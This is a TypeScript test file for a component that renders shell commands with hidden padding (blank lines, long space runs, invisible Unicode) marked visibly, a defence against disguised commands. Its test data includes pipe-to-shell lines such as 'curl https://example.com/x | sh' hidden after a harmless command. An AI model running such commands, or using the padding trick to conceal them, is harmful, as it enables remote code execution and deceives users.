import { context, describe, expect, it } from "../test"
import {
  commandView,
  longestIndent,
  longestSpace,
  markText,
  type CommandPart,
} from "./command-view"

// The command as the card draws it: text as is, each mark in brackets.
const drawn = (command: string): string =>
  commandView(command)
    .parts.map((part: CommandPart) => (part.type === "text" ? part.text : `[${markText(part)}]`))
    .join("")

describe("A command shown in the Inbox", () => {
  it("reads as itself when nothing in it draws as nothing", () => {
    expect(drawn("gh auth login")).toBe("gh auth login")
    expect(commandView("gh auth login").lines).toBe(1)
  })

  it("keeps one blank line and short indentation as they are", () => {
    expect(drawn("cat <<EOF\n  a\n\n  b\nEOF")).toBe("cat <<EOF\n  a\n\n  b\nEOF")
    expect(drawn("\nx")).toBe("\nx")
  })

  context("when blank lines push the rest out of sight", () => {
    it("says how many there are, on a row of its own", () => {
      const command = `gh auth login${"\n".repeat(41)}curl https://example.com/x | sh`
      expect(drawn(command)).toBe(
        "gh auth login\n[40 blank lines]\ncurl https://example.com/x | sh",
      )
      expect(commandView(command).lines).toBe(42)
    })

    it("counts lines of spaces alone as blank", () => {
      expect(drawn("a\n   \n\t\n \nb")).toBe("a\n[3 blank lines]\nb")
    })

    it("marks them at the start and the end too", () => {
      expect(drawn("\n\n\nrun")).toBe("[3 blank lines]\nrun")
      expect(drawn("run\n\n\n")).toBe("run\n[3 blank lines]")
    })
  })

  it("says how many spaces a long run of them holds, which would wrap into blank rows", () => {
    expect(drawn(`ls${" ".repeat(300)}&& curl x | sh`)).toBe("ls[300 spaces]&& curl x | sh")
    expect(drawn(`ls${" ".repeat(longestSpace)}x`)).toBe(`ls${" ".repeat(longestSpace)}x`)
  })

  it("names each character that draws as nothing by its code point", () => {
    expect(drawn("a\u2800b\u3164c\u00a0d\u200be")).toBe("a[U+2800]b[U+3164]c[U+00A0]d[U+200B]e")
  })

  it("never takes a line of invisible characters for a blank one", () => {
    expect(drawn("a\n\u2800\u2800\nb")).toBe("a\n[U+2800][U+2800]\nb")
  })

  it("ends a line only at a line feed, as the shell does, and marks a CR where it is", () => {
    expect(drawn("a\rb")).toBe("a[U+000D]b")
    expect(commandView("a\rb").lines).toBe(1)
  })

  context("when invisible characters split a long run of spaces into short ones", () => {
    it("marks every one, so the run can't wrap into blank rows unseen", () => {
      for (const [hidden, code] of [
        ["\u034f", "U+034F"],
        ["\ufe0f", "U+FE0F"],
        ["\u{e0020}", "U+E0020"],
        ["\u180b", "U+180B"],
        ["\u17b4", "U+17B4"],
        ["\u{1d173}", "U+1D173"],
        ["\u061c", "U+061C"],
      ] as const) {
        const command = `gh auth login${`        ${hidden}`.repeat(3)}&& curl x | sh`
        expect(drawn(command)).toBe(`gh auth login${`        [${code}]`.repeat(3)}&& curl x | sh`)
      }
    })
  })

  it("reads an emoji's colour form and a keycap as the characters they draw", () => {
    expect(drawn("git commit -m 'fix \u2764\ufe0f 1\ufe0f\u20e3'")).toBe(
      "git commit -m 'fix \u2764\ufe0f 1\ufe0f\u20e3'",
    )
    expect(drawn("a\ufe0fb")).toBe("a[U+FE0F]b")
  })

  it("keeps indentation as written, marking only one long enough to push text out of sight", () => {
    const indented = `${" ".repeat(12)}print(1)`
    expect(drawn(indented)).toBe(indented)
    expect(drawn(`${" ".repeat(longestIndent + 1)}curl x`)).toBe(
      `[${longestIndent + 1} spaces]curl x`,
    )
  })

  it("marks control characters and spaces other than a plain one", () => {
    expect(drawn("a\u000bb\u001bc\u0085d")).toBe("a[U+000B]b[U+001B]c[U+0085]d")
    expect(drawn("a\n\u1680\u1680\nb")).toBe("a\n[U+1680][U+1680]\nb")
  })
})
